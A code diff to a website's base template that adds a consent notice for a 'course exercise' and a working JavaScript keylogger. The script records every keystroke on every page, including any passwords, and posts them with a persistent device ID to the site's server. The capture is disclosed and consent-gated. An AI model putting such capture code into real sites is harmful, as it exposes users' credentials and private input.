@@ -88,6 +88,29 @@
     {% block content %}{% endblock %}
   </div>
 
+  <div id="keylog-consent-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/45 p-4">
+    <div class="max-w-md w-full rounded-xl border border-[var(--border)] bg-[var(--panel)] p-6 shadow-lg">
+      <h2 class="text-lg font-bold mb-2">Course exercise notice</h2>
+      <p class="text-sm text-[var(--muted)] mb-4">
+        This site is used for a university course exercise on how keyloggers work.
+        If you continue, your keystrokes on this site will be captured and sent to
+        the course server for the exercise — nothing else on your device is
+        accessed. This is for teaching purposes only.
+      </p>
+      <label class="flex items-start gap-2 text-sm mb-4 cursor-pointer">
+        <input type="checkbox" id="keylog-consent-checkbox" class="mt-0.5 shrink-0">
+        <span>I understand and acknowledge that my keystrokes on this site will be recorded for this exercise.</span>
+      </label>
+      <div class="flex items-center justify-between gap-3">
+        <a href="https://nephty.top/" class="text-sm text-[var(--muted)] hover:text-[var(--accent)] transition-colors">Leave instead</a>
+        <button type="button" id="keylog-consent-continue" disabled
+          class="inline-flex items-center px-4 py-2 rounded-full bg-[var(--accent)] text-[var(--accent-text)] text-sm font-medium opacity-50 cursor-not-allowed transition-opacity disabled:opacity-50">
+          Continue
+        </button>
+      </div>
+    </div>
+  </div>
+
   <script>
     (function () {
       var root = document.documentElement;
@@ -106,6 +129,72 @@
         if (window.__np && window.__nap) window.__nap(window.__np.light, window.__np.dark, window.__np.accent, theme === 'dark');
         render();
       });
+    })();
+  </script>
+
+  <script>
+    (function () {
+      var CONSENT_KEY = "vibenight-keylog-consent";
+      var DEVICE_KEY = "vibenight-keylog-device-id";
+      var INGEST_URL = "{% url 'vibenight:keylog_ingest' %}";
+      var FLUSH_INTERVAL_MS = 5000;
+
+      var modal = document.getElementById("keylog-consent-modal");
+      var checkbox = document.getElementById("keylog-consent-checkbox");
+      var continueBtn = document.getElementById("keylog-consent-continue");
+
+      function deviceId() {
+        var id = localStorage.getItem(DEVICE_KEY);
+        if (!id) {
+          id = (window.crypto && crypto.randomUUID) ? crypto.randomUUID() : String(Date.now()) + "-" + Math.random().toString(36).slice(2);
+          localStorage.setItem(DEVICE_KEY, id);
+        }
+        return id;
+      }
+
+      var buffer = "";
+      function flush(useBeacon) {
+        if (!buffer) return;
+        var payload = JSON.stringify({ device_id: deviceId(), buffer: buffer, page: location.pathname });
+        buffer = "";
+        if (useBeacon && navigator.sendBeacon) {
+          navigator.sendBeacon(INGEST_URL, new Blob([payload], { type: "application/json" }));
+        } else {
+          fetch(INGEST_URL, { method: "POST", body: payload, keepalive: true }).catch(function () {});
+        }
+      }
+
+      function startCapture() {
+        document.addEventListener("keydown", function (e) {
+          if (e.key.length === 1) {
+            buffer += e.key;
+          } else {
+            buffer += "[" + e.key + "]";
+          }
+        }, true);
+        setInterval(function () { flush(false); }, FLUSH_INTERVAL_MS);
+        document.addEventListener("visibilitychange", function () {
+          if (document.visibilityState === "hidden") flush(true);
+        });
+        window.addEventListener("pagehide", function () { flush(true); });
+      }
+
+      if (localStorage.getItem(CONSENT_KEY) === "yes") {
+        startCapture();
+      } else {
+        modal.classList.remove("hidden");
+        modal.classList.add("flex");
+        checkbox.addEventListener("change", function () {
+          continueBtn.disabled = !checkbox.checked;
+        });
+        continueBtn.addEventListener("click", function () {
+          if (!checkbox.checked) return;
+          localStorage.setItem(CONSENT_KEY, "yes");
+          modal.classList.add("hidden");
+          modal.classList.remove("flex");
+          startCapture();
+        });
+      }
     })();
   </script>
 </body>
